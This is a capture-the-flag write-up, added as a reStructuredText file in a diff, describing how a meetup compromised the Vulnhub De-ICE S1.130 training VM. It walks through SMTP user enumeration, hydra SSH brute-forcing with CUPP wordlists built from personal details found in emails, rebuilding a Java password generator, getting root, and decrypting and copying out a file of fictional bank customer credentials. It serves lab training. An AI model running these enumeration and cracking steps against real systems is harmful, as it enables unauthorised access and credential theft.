@@ -1,0 +1,592 @@
+.. include:: /pentest_links.txt
+
+.. _De-ICE5:
+
+**************
+De-ICE Level 5
+**************
+
+Setup
+=====
+
+This is to document the meetup's efforts responding to the challenge `Vulnhub De-ICE: S1.130 <https://www.vulnhub.com/entry/de-ice-s1130,11/>`_, the fifth of the Vulnhub De-ICE series. The challenge is to get the file containing new user bank account information.
+
+This De-ICE challenge is another password cracking test of patience. While none of the steps are exceptionally difficult, the online password cracking lists are big enough to take potentially many hours to try; given it's not a sure path, many might give up on that being the correct path. Most of the time they'd be correct, but in this case not. And there's no way to finish this exercise in anything close to 1 hour even knowing the required steps - the online password cracking takes too long.
+
+Setting up the VM
+-----------------
+
+The VM comes packaged as the live ISO `De-ICE_S1.130.iso <http://hackingdojo.com/downloads/iso/De-ICE_S1.130.iso>`_ running SLAX 5.1.7 (based on Slackware 10.2.0). It uses fixed IP 192.168.1.20.
+
+Setting up your environment
+---------------------------
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice5
+  mkdir -p $PT
+  cd $PT
+  # download de-ice5_setup.sh
+  curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/de-ice5_setup.sh
+  # edit as needed; later the recon will give you TARGET IPs
+  source de-ice5_setup.sh
+
+The source for :file:`de-ice5_setup.sh` (:download:`de-ice5_setup.sh`) should look something like the following.
+
+.. literalinclude:: de-ice5_setup.sh
+   :language: bash
+
+Reconnaisance
+=============
+
+Network reconnaissance
+----------------------
+
+Start with some standard network reconnaissance looking for the vulnerable host:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice5
+  source $PT/de-ice5_setup.sh
+  cd $PT/nmap
+
+  $SUDO nmap -sn -PE -oA nmap_sn $SUBNET
+  $SUDO chown $USER.$USER nmap_sn.*
+  # use the grep-able output to get a list of target hosts
+  grep Up nmap_sn.gnmap | cut -d" " -f2 > $TARGETS
+  # use the xml output to get an html report
+  xsltproc nmap_sn.xml -o nmap_sn.html
+
+Here we find the IP for de-ice5: $TARGET. Update $PT/de-ice5_setup.sh and also edit :file:`/etc/hosts` to add "de-ice5.com" (``echo "$TARGET de-ice5.com" | $SUDO tee -a /etc/hosts``).
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice5
+  source $PT/de-ice5_setup.sh
+  cd $PT/nmap
+
+  $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -oA nmap_A $TARGET
+  $SUDO chown $USER.$USER nmap_A.*
+  xsltproc nmap_A.xml -o nmap_A.html
+
+Running this reveals:
+
+.. code-block:: console
+  :emphasize-lines: 1-4,6,8,11,15-16
+
+  PORT    STATE  SERVICE  REASON         VERSION
+  20/tcp  closed ftp-data reset ttl 64
+  21/tcp  open   ftp      syn-ack ttl 64 vsftpd 2.0.4
+  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+  |_Can't get directory listing: Can't parse PASV response: "OOPS: capset"
+  22/tcp  open   ssh      syn-ack ttl 64 OpenSSH 4.3 (protocol 1.99)
+  |_sshv1: Server supports SSHv1
+  25/tcp  open   smtp     syn-ack ttl 64 Sendmail 8.13.7/8.13.7
+  | smtp-commands: slax.example.net Hello [192.168.1.100], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP, 
+  |_ 2.0.0 This is sendmail version 8.13.7 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info 
+  80/tcp  open   http     syn-ack ttl 64 Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+  |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+  |_http-server-header: Apache/2.0.55 (Unix) PHP/5.1.2
+  |_http-title: Site doesn't have a title (text/html).
+  110/tcp open   pop3     syn-ack ttl 64 Openwall popa3d
+  143/tcp open   imap     syn-ack ttl 64 UW imapd 2004.357
+  |_imap-capabilities: MAILBOX-REFERRALS STARTTLS SCAN LOGIN-REFERRALS IMAP4REV1 SORT completed CAPABILITY THREAD=ORDEREDSUBJECT MULTIAPPEND IDLE SASL-IR BINARY AUTH=LOGINA0001 UNSELECT LITERAL+ NAMESPACE OK THREAD=REFERENCES
+  443/tcp closed https    reset ttl 64
+  MAC Address: 52:54:00:27:18:8C (QEMU Virtual NIC)
+  Device type: general purpose
+  Running: Linux 2.6.X
+  OS CPE: cpe:/o:linux:linux_kernel:2.6
+  OS details: Linux 2.6.13 - 2.6.32
+
+Reconnaissance on port 80
+-------------------------
+
+.. code-block:: bash
+  :emphasize-lines: 5,9,11
+
+  PT=$HOME/pentest/de-ice5
+  source $PT/de-ice5_setup.sh
+  cd $PT/spider
+
+  dirb  http://$HOST/ -o dirb80_$HOST.txt
+  # results in
+  # + http://de-ice5.com/cgi-bin/ (CODE:403|SIZE:295)                              
+  # + http://de-ice5.com/index.php (CODE:200|SIZE:1980)                            
+  # + http://de-ice5.com/index2.php (CODE:200|SIZE:563)                            
+  # + http://de-ice5.com/info.php (CODE:200|SIZE:37910)                            
+  # + http://de-ice5.com/~sysadmin (CODE:403|SIZE:415)                             
+
+Browsing port 80
+----------------
+
+http://de-ice5.com/index2.php gives an email address "customerserviceadmin@nosecbank.com". This may be an alias for a real user id and so we'll try all of EXPN, VRFY and RCPT against "customerservieadmin" and "sysadmin", along with a user id that must exist ("root") and one that doesn't exist ("0 0"):
+
+.. code-block:: bash
+  :emphasize-lines: 5-10,12-
+
+  PT=$HOME/pentest/de-ice5
+  source $PT/de-ice5_setup.sh
+  cd $PT/exploit
+
+  cat >users.txt <<EOF
+  customerserviceadmin
+  sysadmin
+  root
+  0 0
+  EOF
+
+  smtp-user-enum -M EXPN -U users.txt -t de-ice5.com
+  # result - no users exist
+  smtp-user-enum -M VRFY -U users.txt -t de-ice5.com
+  # result - all users exist
+  smtp-user-enum -M RCPT -U users.txt -t de-ice5.com
+  # result - root and sysadmin exists
+
+So we can only trust ``smtp-user-enum -M RCPT ...`` for enumerating actual users.
+
+
+The Exploit
+===========
+
+Getting user id's for online password cracking
+----------------------------------------------
+
+A long :program:`hydra` run failed to crack passwords for "root" and "sysadmin". So use :program:`smtp-user-enum` to try to determine the customer service account:
+
+.. code-block:: bash
+  :emphasize-lines: 5-6,10,14-
+
+  PT=$HOME/pentest/de-ice5
+  source $PT/de-ice5_setup.sh
+  cd $PT/exploit
+
+  # Guess customersupportadmin account:
+  # Generate {c,cust,customer} x {s,sup,supp,support} x {a,ad,adm,admin}
+  for c in c cust customer; do
+  for s in s sup supp support; do
+  for a in a ad adm admin; do
+    echo "$c$s$a" >> users.txt
+  done
+  done
+  done
+  smtp-user-enum -M RCPT -U users.txt -t de-ice5.com
+  # results in
+  # de-ice5.com: csadmin exists
+
+Try user csadmin
+----------------
+
+So let's try and crack "csadmin":
+
+.. code-block:: bash
+  :emphasize-lines: 5-
+
+  PT=$HOME/pentest/de-ice5
+  source $PT/de-ice5_setup.sh
+  cd $PT/exploit
+
+  hydra -F -l csadmin -P /usr/share/wordlists/nmap.lst -t 2 de-ice5.com ssh
+  # results in
+  # [22][ssh] host: de-ice5.com   login: csadmin   password: rocker
+
+A little reconnaissance using csadmin gives three items of interest: user ids from :file:`/etc/passwd`, the encrypted flag file :file:`/home/ftp/incoming/useracc_update.csv.enc`, and two mail files in :file:`mailserv_download/`:
+
+.. code-block:: console
+  :emphasize-lines: 1-2,5-8,9-12,14-15
+
+  ssh csadmin@de-ice5.com    # password 'rocker'
+  cat /etc/passwd
+  # results in
+  # root:x:0:0::/root:/bin/bash
+  # sysadmin:x:1000:10:,,,:/home/sysadmin:/bin/bash
+  # dbadmin:x:1001:100:,,,:/home/dbadmin:/bin/bash
+  # sdadmin:x:1002:100:,,,:/home/sdadmin:/bin/bash
+  # csadmin:x:1003:100:,,,:/home/csadmin:/bin/bash
+  # Show the flag data:
+  ls -l /home/ftp/incoming/useracc_update.csv.enc
+  # Show the email data:
+  ls -l $HOME/mailserv_download/
+  # returns
+  # -rw-r--r-- 1 csadmin users  1186 Dec 30  2010 2010122014234.j12Gqo4H049241
+  # -rw-r--r-- 1 csadmin users 25462 Dec 30  2010 2010122216451.f81Ltw4R010211.part2
+  # see the java code
+  strings $HOME/mailserv_download/2010122216451.f81Ltw4R010211.part2
+  # see the email
+  file $HOME/mailserv_download/2010122014234.j12Gqo4H049241
+  # returns
+  # /home/csadmin/mailserv_download/2010122014234.j12Gqo4H049241: ASCII mail text
+  cat $HOME/mailserv_download/2010122014234.j12Gqo4H049241
+  exit
+
+Running ``strings 2010122216451.f81Ltw4R010211.part2`` shows it has embedded Java code, but it's only "part2". Displaying :file:`2010122014234.j12Gqo4H049241` shows it's mail text:
+
+.. code-block:: console
+  :emphasize-lines: 4,5,20-21,23-24
+
+  To: csadmin@nosecbank.com
+  CC: 
+  Subject: My Son's Birthday
+  Date: Mon, 20 Dec 2010 14:23:46 +0500
+  Return-Path: <sdadmin@nosecbank.com>
+  Delivered-To: csadmin:nosecbank.com@nosecbank.com
+  Received: (qmail 20281 invoked from network); 20 Dec 2010 09:23:46 -0000
+  X-Received: from network (192.168.1.123) by mailserv1-3.us6.service.com; 
+  20 Dec 2010 09:23:46 -0000
+  Received: from www.nosecbank.com (unknown [198.65.139.34]) by 
+  srv5.us6.service.com (Postfix) with ESMTP id D98402459DD for 
+  <csadmin@nosecbank.com>; Mon, 20 Dec 2010 09:23:46 +0000 (GMT)
+  Message-Id: <2010122014234.j12Gqo4H049241@www.nosecbank.com>
+  Mime-Version: 1.0
+  Content-Type: multipart/alternative; 
+  boundary="---=_NextPart_000_0000_02F24S11.FEPQRE80"
+  X-Mailer: K-Mail; Build 1.0.5510
+  Thread-Index: Qw2cWVmE3odZs3TqTTqFvS1e3lexms==
+  Message: Hey Mark, I am curious if you would be free to come over and 
+  visit for my son Donovin's birthday tomorrow after work.  I would also 
+  appreciate if you brought Andy with you as well, because Donny 
+  really enjoyed playing with him last time he was over.  I know its short 
+  notice but he is turning 12 and it is special for both him and me. Let 
+  me know if this works. Thanks!  -Paul
+
+This email is from sdadmin to csadmin. Perhaps we should turn our attention to sdadmin.
+
+Try user sdadmin
+----------------
+
+A normal :program:`hydra` run trying to crack sdadmin's password fails. So we'll try `Mebus/cupp <https://github.com/Mebus/cupp>`_ to generate password guesses:
+
+.. code-block:: bash
+  :emphasize-lines: 5,11,13-18,20-
+
+  PT=$HOME/pentest/de-ice5
+  source $PT/de-ice5_setup.sh
+  cd $PT/exploit
+
+  # First download CUPP
+  curl --silent --insecure --remote-name \
+    https://raw.githubusercontent.com/Mebus/cupp/master/cupp.py
+  curl --silent --insecure --remote-name \
+    https://raw.githubusercontent.com/Mebus/cupp/master/cupp.cfg
+
+  # Generate passwords for sdadmin using CUPP
+  python cupp.py -h
+  python cupp.py -i
+  # non-default values entered
+  # > First Name: Paul
+  # > Child's name: Donovin
+  # > Child's nickname: Donny
+  # > Child's birthdate (DDMMYYYY): 21121998
+
+  # Try and crack sdadmin
+  hydra -F -l sdadmin -P paul.txt -t 2 de-ice5.com ssh
+  # results in
+  # [22][ssh] host: de-ice5.com   login: sdadmin   password: donovin1998
+
+A little reconnaissance using sdadmin gives two similar mail files:
+
+.. code-block:: bash
+  :emphasize-lines: 1-2,4-5
+
+  sshpass -p 'donovin1998' ssh sdadmin@de-ice5.com
+  ls -l $HOME/mailserv_download/
+  # returns
+  # -rw-r--r-- 1 sdadmin users  1267 Dec 29  2010 2010122015043.j15Htu1H341102
+  # -rw-r--r-- 1 sdadmin users 14178 Dec 30  2010 2010122216451.f81Ltw4R010211.part3
+  # see the java code
+  strings $HOME/mailserv_download/2010122216451.f81Ltw4R010211.part3
+  # see the email
+  file $HOME/mailserv_download/2010122015043.j15Htu1H341102
+  # returns
+  # /home/csadmin/mailserv_download/2010122014234.j12Gqo4H049241: ASCII mail text
+  cat $HOME/mailserv_download/2010122015043.j15Htu1H341102
+  exit
+
+Running ``strings 2010122216451.f81Ltw4R010211.part3`` shows it has embedded Java code, but it's only "part3". Displaying :file:`2010122015043.j15Htu1H341102` shows it's mail text:
+
+.. code-block:: console
+  :emphasize-lines: 21,23
+
+  To: sdadmin@nosecbank.com
+  CC: 
+  Subject: RE: My Son's Birthday
+  Date: Mon, 20 Dec 2010 15:04:32 +0500
+  Return-Path: <csadmin@nosecbank.com>
+  Delived-To: sdadmin:nosecbank.com@nosecbank.com
+  Received: (qmail 20281 invoked from network); 20 Dec 2010 10:04:32 -0000
+  X-Received: from network (192.168.1.123) by mailserv3-4.us6.service.com; 
+  20 Dec 2010 10:04:32 -0000
+  Received: from www.nosecbank.com (unknown [198.65.139.32]) by 
+  srv3.us6.service.com (Postfix) with ESMTP id D98214787FD for 
+  <csadmin@nosecbank.com; Mon, 20 Dec 2010 10:04:32 +0000 (GMT)
+  Message-Id: <2010122015043.j15Htu1H341102@www.nosecbank.com>
+  Mime-Version: 1.0
+  Content-Type: multipart/alternative; 
+  boundary="---=_NextPart_000_0000_05F11S20.FGHZWE49"
+  X-Mailer: K-Mail; Build 1.0.5510
+  Thread-Index: Aa5fqAwT8nsBe3T3T5q67a3Fd22XsZ==
+  Message: Hey there Paul!  I would gladly bring myself and my son over 
+  tomorrow after work!  I would only be hesitant to come over if you 
+  invited Fred over too... He just freaks me out sometimes.  It doesnt 
+  help that he locks himself up in his office and is anti-social during 
+  lunch hours... On top of that he calls himself the "databaser"!  I mean, 
+  who in thier right mind does that?  Either way, I will most likely be 
+  there tomorrow.  I look forward to it!   -Mark
+
+We're guessing Fred (the "databaser") is the missing dbadmin user. Rather than hurling :program:`hydra` at it with a standard password list, let's see if we can repeat using the email information in CUPP to generate another password list.
+
+Try user dbadmin
+----------------
+
+So we'll try `Mebus/cupp <https://github.com/Mebus/cupp>`_ to generate password guesses:
+
+.. code-block:: bash
+  :emphasize-lines: 11,13-
+
+  PT=$HOME/pentest/de-ice5
+  source $PT/de-ice5_setup.sh
+  cd $PT/exploit
+
+  # CUPP already downloaded above.
+  # curl --silent --insecure --remote-name \
+  #   https://raw.githubusercontent.com/Mebus/cupp/master/cupp.py
+  # curl --silent --insecure --remote-name \
+  #   https://raw.githubusercontent.com/Mebus/cupp/master/cupp.cfg
+
+  # Generate passwords for dbadmin using CUPP
+  python cupp.py -h
+  python cupp.py -i
+  # non-default values entered
+  # > First Name: Fred
+  # > Nickname: databaser
+  # > Do you want to add special chars at the end of words? Y/[N]: y
+  # > Do you want to add some random numbers at the end of words? Y/[N]: y
+  # Try and crack dbadmin
+  hydra -F -l dbadmin -P fred.txt -t 2 de-ice5.com ssh
+  # results in
+  # [22][ssh] host: de-ice5.com   login: dbadmin   password: databaser60
+
+A little reconnaissance using dbadmin reveals the part1 mail file:
+
+.. code-block:: bash
+  :emphasize-lines: 5-8
+
+  PT=$HOME/pentest/de-ice5
+  source $PT/de-ice5_setup.sh
+  cd $PT/exploit
+
+  sshpass -p 'donovin1998' ssh sdadmin@de-ice5.com
+  ls -l $HOME/mailserv_download/
+  # returns
+  # -rw-r--r-- 1 dbadmin users 13985 Dec 30  2010 2010122216451.f81Ltw4R010211.part1
+  exit
+
+Running ``strings 2010122216451.f81Ltw4R010211.part1`` shows it has embedded Java code, but it's only "part1".
+
+Running the java code to get root, sysadmin passwords
+-----------------------------------------------------
+
+So let's collect the java code on Kali:
+
+.. code-block:: bash
+  :emphasize-lines: 5-
+
+  PT=$HOME/pentest/de-ice5
+  source $PT/de-ice5_setup.sh
+  cd $PT/exploit
+
+  { sshpass -p 'databaser60' ssh dbadmin@de-ice5.com \
+      'cat /home/dbadmin/mailserv_download/2010122216451.f81Ltw4R010211.part1';
+    sshpass -p 'rocker' ssh csadmin@de-ice5.com \
+      'cat /home/csadmin/mailserv_download/2010122216451.f81Ltw4R010211.part2';
+    sshpass -p 'donovin1998' ssh sdadmin@de-ice5.com \
+      'cat /home/sdadmin/mailserv_download/2010122216451.f81Ltw4R010211.part3';
+  } | strings -n 10 | grep -v 'MESSAGE CORRUPTED' > Exploit.java
+
+
+First clean up the code, moving lines 46-49 to the end. Next, run in through a Java cleanup site. Then add a main routine at the top.
+
+.. code-block:: java
+
+  public class Exploit {
+
+  public static void main(String[] args) {
+
+    Exploit e = new Exploit();
+    int c[] = e.processLoop(args[0]);
+    System.out.println(args[0] + "=");
+    for (int i = 0; i < c.length; i++)
+      System.out.print((char)c[i]);
+    System.out.print("");
+  }
+
+  // ... rest of code
+  
+  }
+
+Next make these corrections:
+
+* ``int[] encArr = int[strL + 2];`` to ``int[] encArr = new int[strL + 2];``
+
+* ``int[] encNew = int[input.length + ref];`` to ``int[] encNew = new int[input.length + ref];``
+
+* ``int strL = input.length;`` to ``int strL = input.length();``
+
+* ``encArr = loopProcesS(encArr);`` to ``encArr = loopProcess(encArr);``
+
+* ``if (i % 2 == 0) input[i] = (input[i] % check) + (ref + i);`` to ``if (i % 2 == 0) input[i] = (input[i] % ch) + (ref + i);``
+
+* ``for (int i = 0; i < encArr; i++) {`` to ``for (int i = 0; i < encArr.length; i++) {``
+
+* ``for (int i = 0; i < strL + 1; i++) {`` to ``for (int i = 1; i < strL + 1; i++) {``
+
+At this point the code should look something like:
+
+.. code-block:: java
+
+  public class Exploit {
+
+  public static void main(String[] args) {
+
+    Exploit e = new Exploit();
+    int c[] = e.processLoop(args[0]);
+    System.out.println(args[0] + "=");
+    for (int i = 0; i < c.length; i++)
+      System.out.print((char)c[i]);
+    System.out.print("\n");
+  }
+
+
+  /*input is username of account*/
+  int[] processLoop(String input) {
+	  int strL = input.length();
+	  int lChar = (int) input.charAt(strL - 1);
+	  int fChar = (int) input.charAt(0);
+	  int[] encArr = new int[strL + 2];
+	  for (int i = 1; i < strL + 1; i++) {
+		  encArr[i] = (int) input.charAt(i - 1);
+	  }
+	  encArr[0] = (int) lChar;
+	  encArr[encArr.length - 1] = (int) fChar;
+	  encArr = backLoop(encArr);
+	  encArr = loopBack(encArr);
+	  encArr = loopProcess(encArr);
+	  int j = encArr.length - 1;
+	  for (int i = 0; i < encArr.length; i++) {
+		  if (i == j) break;
+		  int t = encArr[i];
+		  encArr[i] = encArr[j];
+		  encArr[j] = t;
+		  j--;
+	  }
+	  return encArr;
+  }
+  /*Note the pseudocode will be implemented with the 	
+  root account and my account, we still need to implement it with the csadmin, sdadmin,	
+  and dbadmin accounts though*/
+  int[] backLoop(int[] input) {
+	  int ref = input.length;
+	  int a = input[1];
+	  int b = input[ref - 1];
+	  int ch = (a + b) / 2;
+	  for (int i = 0; i < ref; i++) {
+		  if (i % 2 == 0) input[i] = (input[i] % ch) + (ref + i);
+		  else input[i] = (input[i] + ref + i);
+	  }
+	  return input;
+  }
+  int[] loopBack(int[] input) {
+	  int ref = input.length / 2;
+	  int[] encNew = new int[input.length + ref];
+	  int ch = 0;
+	  for (int i = (ref / 2); i < input.length; i++) {
+		  encNew[i] = input[ch];
+		  ch++;
+	  }
+	  for (int i = 0; i < encNew.length; i++) {
+		  if (encNew[i] <= 33) encNew[i] = 33 + (++ref * 2);
+		  else if (encNew[i] >= 126) encNew[i] = 126 - (--ref * 2);
+		  else {
+			  if (i % 2 == 0) encNew[i] -= (i % 3);
+			  else encNew[i] += (i % 2);
+		  }
+	  }
+	  return encNew;
+  }
+  int[] loopProcess(int[] input) {
+	  for (int i = 0; i < input.length; i++) {
+		  if (input[i] == 40 || input[i] == 41) input[i] += input.length;
+		  else if (input[i] == 45) input[i] += 20 + i;
+	  }
+	  return input;
+  }
+
+  }
+
+Running it should give us our passwords:
+
+.. code-block:: console
+  :emphasize-lines: 1-2,4-5,6,8-9
+
+  javac Exploit.java
+  java Exploit root
+  # returns
+  # root =
+  # 31/Fwxw+2
+  java Exploit sysadmin
+  # returns
+  # sysadmin =
+  # 7531/{{tor/rv/A
+
+Capturing the flag as root
+--------------------------
+
+Since root can't log in directly, login first with csadmin then switch to root to attack the already-found :file:`/home/ftp/incoming/useracc_update.csv.enc`:
+
+.. code-block:: bash
+  :emphasize-lines: 5-
+
+  PT=$HOME/pentest/de-ice5
+  source $PT/de-ice5_setup.sh
+  cd $PT/exploit
+
+  sshpass -p 'rocker' ssh csadmin@de-ice5.com
+  su - root # 31/Fwxw+2
+  id
+  # returns
+  # uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+  cd /home/ftp/incoming
+  # Try using root password to decrypt user account data
+  openssl enc -d -aes-256-cbc -salt -in useracc_update.csv.enc -out flag.csv -pass pass:'31/Fwxw+2'
+  cat flag.csv
+
+To smuggle the data out to Kali is as simple as:
+
+.. code-block:: bash
+  :emphasize-lines: 5
+
+  PT=$HOME/pentest/de-ice5
+  source $PT/de-ice5_setup.sh
+  cd $PT/exploit
+
+  sshpass -p 'rocker' ssh csadmin@de-ice5.com 'cat /home/ftp/incoming/flag.csv' > flag.csv
+
+Running ``cat flag.csv`` gives:
+
+.. code-block:: console
+
+  ID,Last,First,Email,State,Username,Password,Verifacation Code,Pin code
+  1000,Carr,Alfred,acarr23@gmail.com,NY,acarr9096,phantom4,952733,490
+  1001,Karson,William,wkarson53@yahoo.com,NY,wkarson2431,rockallday123,567094,345
+  1002,Wheeler,Cordy,megawheels98@rocketmail.com,NY,cwheeler5031,goeagles90,462724,631
+  1003,Smith,Ken,synthesizer_1r@gmail.com,NY,ksmith6253,crystalization,636721,353
+  1004,Quinn,Cynthia,qcq92@aol.com,NY,cquinn1217,archyandhenry,680247,223
+  1005,Floyd,Wilson,jukeboxer_4life@gmail.com,NY,wfloyd5931,knockout66,521456,441
+  1006,Blake,Markus,sil3nt_gunn3r@yahoo.com,NY,mblake6947,268768924,129632,557
+  1007,Nash,Jillian,wiselife141@aol.com,NY,jnash0934,checkitout1,324672,315
+  1008,Atkins,Alison,double_a44@hotmail.com,NY,aatkins9087,gogogo123123,457094,124
+  1009,Oliver,Frank,fog_of_war0001@gmail.com,NY,foliver9385,falconpunch,783143,134
+  1010,Jones,Edith,msjones677@hotmail.com,NY,ejones7532,chris12345,632620,579
+  1011,Moore,Cody,aiprojectx@gmail.com,NY,dot_Cipher,crypTrace,101010,1337
+
+And we are root and captured the new account data, so are done.
+
